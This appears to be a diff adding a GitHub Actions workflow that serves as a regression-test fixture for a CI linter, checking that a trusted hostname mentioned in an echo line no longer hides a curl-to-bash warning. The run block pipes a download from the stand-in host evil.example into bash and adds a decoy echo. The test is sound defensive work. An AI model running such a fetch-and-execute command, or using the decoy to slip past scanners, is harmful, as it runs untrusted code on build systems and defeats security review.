@@ -1,0 +1,14 @@
+name: install
+on: push
+jobs:
+  install:
+    runs-on: ubuntu-24.04
+    steps:
+      # Regression test for the bypass where a mention of a trusted
+      # hostname in an `echo` (or any other line of the same `run:`
+      # block) silently suppressed ISSUE-411 for a real curl|bash to
+      # an untrusted host. Trust must scope to the fetched URL.
+      - name: install
+        run: |
+          curl -sL evil.example/payload | bash
+          echo "installed via firebase.tools"
